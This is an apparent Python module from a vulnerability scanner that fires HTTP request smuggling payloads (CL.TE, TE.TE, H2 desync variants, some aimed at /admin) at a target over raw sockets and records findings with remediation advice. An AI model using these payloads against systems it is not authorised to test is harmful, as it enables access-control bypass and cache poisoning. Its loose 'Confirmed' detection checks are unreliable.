import re
import ssl
import socket
import time
import urllib.parse
import urllib.request
import urllib.error

from scanners.base_scanner import BaseScanner

CL_TE_PAYLOADS = [
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 44\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "\r\n",
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 10\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G",
]

TE_CL_PAYLOADS = [
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 6\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /",
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 4\r\n"
    "\r\n"
    "5\r\n"
    "A\r\n"
    "0\r\n"
    "\r\n"
    "GET",
]

TE_TE_PAYLOADS = [
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Transfer-encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "\r\n",
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Transfer-Encoding: cow\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /",
]

HEADER_CONFUSION_PAYLOADS = [
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 10\r\n"
    "Content-Length: 5\r\n"
    "\r\n"
    "12345",
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Transfer-Encoding: identity\r\n"
    "\r\n"
    "0\r\n"
    "\r\n",
]

CHUNKED_MALFORM_PAYLOADS = [
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 5\r\n"
    "\r\n"
    "zz\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "\r\n"
    "0\r\n"
    "\r\n",
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5\r\n"
    "A\r\n"
    "0\r\n"
    "\r\n"
    "GET / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "\r\n",
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 9\r\n"
    "\r\n"
    "5\r\n"
    "A\r\n"
    "0\r\n"
    "\r\n"
    "GET /",
]

H2_CL_PAYLOADS = [
    (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5e\r\n"
        "POST /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n",
        "H2.CL variant 1",
    ),
    (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n",
        "H2.CL variant 2",
    ),
]

H2_TE_PAYLOADS = [
    (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "60\r\n"
        "POST /H2-TE-PROBE HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
        "0\r\n"
        "\r\n",
        "H2.TE variant 1",
    ),
    (
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Transfer-Encoding:\x20chunked\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "0\r\n"
        "\r\n",
        "H2.TE variant 2",
    ),
]

_HOSTNAME_RE = re.compile(r"^[a-zA-Z0-9.\-:]+$")


def _sanitize_host(host: str) -> str:
    if not _HOSTNAME_RE.match(host):
        raise ValueError(f"Invalid hostname containing unsafe characters: {host}")
    return host


class RequestSmugglingScanner(BaseScanner):
    SCANNER_NAME = "HTTP Request Smuggling Scanner"
    _SCANNER_KEY = "request_smuggling"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._tested_payloads = 0
        self._smuggling_found = 0

    def _send_raw_request(self, payload_template, timeout=10):
        try:
            parsed = urllib.parse.urlparse(self.target)
            host = _sanitize_host(parsed.netloc.split(":")[0])
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            formatted_payload = payload_template.format(host=host)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            if parsed.scheme == "https":
                ctx = self.get_ssl_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.sendall(formatted_payload.encode())
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 65536:
                    break
            sock.close()
            return response.decode("utf-8", errors="ignore")
        except Exception as e:
            err_str = str(e).lower()
            if "timed out" not in err_str and "connection refused" not in err_str:
                self.log("ERROR", f"[Request Smuggling] Socket error: {e}")
            return None

    def _probe_with_http(self, path="/wss-smuggle-probe"):
        body, status, resp_headers = self._make_request(
            self.target + path, return_response_obj=True
        )
        return status, body

    def _test_cl_te_smuggling(self):
        self.log("INFO", "[Request Smuggling] Testing CL.TE smuggling...")
        probe_status, probe_body = self._probe_with_http()
        for payload in CL_TE_PAYLOADS:
            self._tested_payloads += 1
            response = self._send_raw_request(payload)
            if response and ("admin" in response.lower() or "200 OK" in response):
                self._smuggling_found += 1
                self.log("CRITICAL", "[Request Smuggling] CL.TE smuggling detected!")
                confirm_body, confirm_status = self._probe_with_http("/admin")
                self.add_vuln(
                    title="HTTP Request Smuggling — CL.TE",
                    severity="Critical", category="Request Smuggling", cvss_score=10.0,
                    description="Front-end uses Content-Length while back-end uses Transfer-Encoding, allowing request smuggling. An attacker can bypass security controls by crafting requests that are parsed differently.",
                    remediation="Disable Transfer-Encoding on front-end; normalize request headers; use consistent HTTP parsing; upgrade server software.",
                    evidence=f"Probe returned {probe_status}; smuggled /admin returned {confirm_status}",
                    payload=payload[:120] + "...",
                    request_details=f"CL.TE payload tested on {self.target}",
                    response_details=f"Smuggled response: {response[:300]}",
                    confidence="Confirmed",
                )
                return True
        return False

    def _test_te_cl_smuggling(self):
        self.log("INFO", "[Request Smuggling] Testing TE.CL smuggling...")
        for payload in TE_CL_PAYLOADS:
            self._tested_payloads += 1
            response = self._send_raw_request(payload)
            if response and ("admin" in response.lower() or "200 OK" in response):
                self._smuggling_found += 1
                self.log("CRITICAL", "[Request Smuggling] TE.CL smuggling detected!")
                self.add_vuln(
                    title="HTTP Request Smuggling — TE.CL",
                    severity="Critical", category="Request Smuggling", cvss_score=10.0,
                    description="Front-end uses Transfer-Encoding while back-end uses Content-Length. This discrepancy allows attackers to poison caches and bypass access controls.",
                    remediation="Disable Transfer-Encoding on back-end; normalize request headers; use consistent HTTP parsing.",
                    evidence=f"TE.CL payload succeeded on {self.target}",
                    payload=payload[:120] + "...",
                    request_details=f"TE.CL payload tested on {self.target}",
                    response_details=f"Smuggled response: {response[:300]}",
                    confidence="Confirmed",
                )
                return True
        return False

    def _test_te_te_smuggling(self):
        self.log("INFO", "[Request Smuggling] Testing TE.TE smuggling...")
        for payload in TE_TE_PAYLOADS:
            self._tested_payloads += 1
            response = self._send_raw_request(payload)
            if response and ("admin" in response.lower() or "200 OK" in response):
                self._smuggling_found += 1
                self.log("CRITICAL", "[Request Smuggling] TE.TE smuggling detected!")
                self.add_vuln(
                    title="HTTP Request Smuggling — TE.TE",
                    severity="Critical", category="Request Smuggling", cvss_score=10.0,
                    description="Different servers process Transfer-Encoding headers differently. By obfuscating the TE header, an attacker can cause front-end and back-end to disagree on request boundaries.",
                    remediation="Normalize Transfer-Encoding headers; reject duplicate headers; use consistent HTTP parsing.",
                    evidence=f"TE.TE payload succeeded on {self.target}",
                    payload=payload[:120] + "...",
                    request_details=f"TE.TE payload tested on {self.target}",
                    response_details=f"Smuggled response: {response[:300]}",
                    confidence="Confirmed",
                )
                return True
        return False

    def _test_header_confusion(self):
        self.log("INFO", "[Request Smuggling] Testing header confusion...")
        for payload in HEADER_CONFUSION_PAYLOADS:
            self._tested_payloads += 1
            response = self._send_raw_request(payload)
            if response and "error" not in response.lower() and "bad request" not in response.lower():
                self._smuggling_found += 1
                self.log("WARNING", "[Request Smuggling] Header confusion detected!")
                self.add_vuln(
                    title="HTTP Request Smuggling — Header Confusion",
                    severity="High", category="Request Smuggling", cvss_score=8.5,
                    description="Server processes duplicate/conflicting headers inconsistently. This can lead to request smuggling.",
                    remediation="Reject duplicate headers; normalize header names; implement strict header validation.",
                    evidence=f"Duplicate Content-Length/Transfer-Encoding accepted",
                    payload=payload[:120] + "...",
                    request_details=f"Header confusion payload on {self.target}",
                    response_details=f"Server accepted: {response[:200]}",
                    confidence="High",
                )
                return True
        return False

    def _test_chunked_malformation(self):
        self.log("INFO", "[Request Smuggling] Testing chunked encoding malformation...")
        for payload in CHUNKED_MALFORM_PAYLOADS:
            self._tested_payloads += 1
            response = self._send_raw_request(payload)
            if response and ("admin" in response.lower() or "200 OK" in response):
                self._smuggling_found += 1
                self.log("WARNING", "[Request Smuggling] Chunked encoding malformation detected!")
                self.add_vuln(
                    title="HTTP Request Smuggling — Chunked Encoding Malformation",
                    severity="High", category="Request Smuggling", cvss_score=8.0,
                    description="Server accepts malformed chunked encoding (invalid chunk sizes, extra data after 0\r\n). This enables request smuggling via chunk parsing inconsistencies.",
                    remediation="Reject invalid chunk sizes; strictly validate chunked encoding per RFC 7230.",
                    evidence=f"Malformed chunked payload accepted",
                    payload=payload[:120] + "...",
                    request_details=f"Chunked malformation payload on {self.target}",
                    response_details=f"Server response: {response[:200]}",
                    confidence="High",
                )
                return True
        return False

    def _test_h2_cl_desync(self):
        self.log("INFO", "[Request Smuggling] Testing H2.CL desync...")
        parsed = urllib.parse.urlparse(self.target)
        host = _sanitize_host(parsed.netloc.split(":")[0])
        for payload_template, desc in H2_CL_PAYLOADS:
            self._tested_payloads += 1
            t0 = time.time()
            response = self._send_raw_request(payload_template)
            elapsed = time.time() - t0
            if response:
                resp_lower = response.lower()
                if "h2-te-probe" in resp_lower or "admin" in resp_lower:
                    self._report_h2("H2.CL", desc, elapsed)
                    return True
                if elapsed > 3.0 and "variant 2" in desc:
                    self._report_h2("H2.CL", desc + f" (stalled {elapsed:.1f}s)", elapsed)
                    return True
        self.log("INFO", "[Request Smuggling] H2.CL — no desync confirmed.")
        return False

    def _test_h2_te_desync(self):
        self.log("INFO", "[Request Smuggling] Testing H2.TE desync...")
        for payload_template, desc in H2_TE_PAYLOADS:
            self._tested_payloads += 1
            response = self._send_raw_request(payload_template)
            if response:
                resp_lower = response.lower()
                if "h2-te-probe" in resp_lower or "400" in resp_lower[:50]:
                    self._report_h2("H2.TE", desc, 0)
                    return True
        self.log("INFO", "[Request Smuggling] H2.TE — no desync confirmed.")
        return False

    def _report_h2(self, variant, desc, elapsed):
        self._smuggling_found += 1
        self.log("CRITICAL", f"[Request Smuggling] {variant} DESYNC DETECTED! {desc}")
        timing = f" Backend stalled {elapsed:.1f}s." if elapsed > 1 else ""
        self.add_vuln(
            title=f"HTTP Request Smuggling — {variant} HTTP/2 Desync",
            severity="Critical", category="Request Smuggling", cvss_score=10.0,
            description=f"{variant} HTTP/2-to-HTTP/1.1 desync detected.{timing} The frontend and backend disagree on request boundaries.",
            remediation="Force HTTP/2 end-to-end; strip Transfer-Encoding before forwarding; reject conflicting CL+TE requests.",
            evidence=f"{variant} desync confirmed via {desc}",
            payload=variant,
            request_details=f"{variant} payload on {self.target}",
            response_details=f"{desc}, timing: {elapsed:.2f}s",
            confidence="Confirmed",
        )

    def run(self):
        self.log("INFO", f"[Request Smuggling] Starting scan on {self.target}...")
        try:
            if self._test_cl_te_smuggling():
                return self.vulns
            if self._test_te_cl_smuggling():
                return self.vulns
            if self._test_te_te_smuggling():
                return self.vulns
            self._test_header_confusion()
            self._test_chunked_malformation()
            self.log("INFO", "[Request Smuggling] Starting H2 desync tests...")
            if self._test_h2_cl_desync():
                return self.vulns
            if self._test_h2_te_desync():
                return self.vulns
        except Exception as e:
            self.log("ERROR", f"[Request Smuggling] Scan error: {e}")
        self.log(
            "SUCCESS" if not self.vulns else "WARNING",
            f"[Request Smuggling] Complete — {self._tested_payloads} payload(s) tested",
        )
        return self.vulns
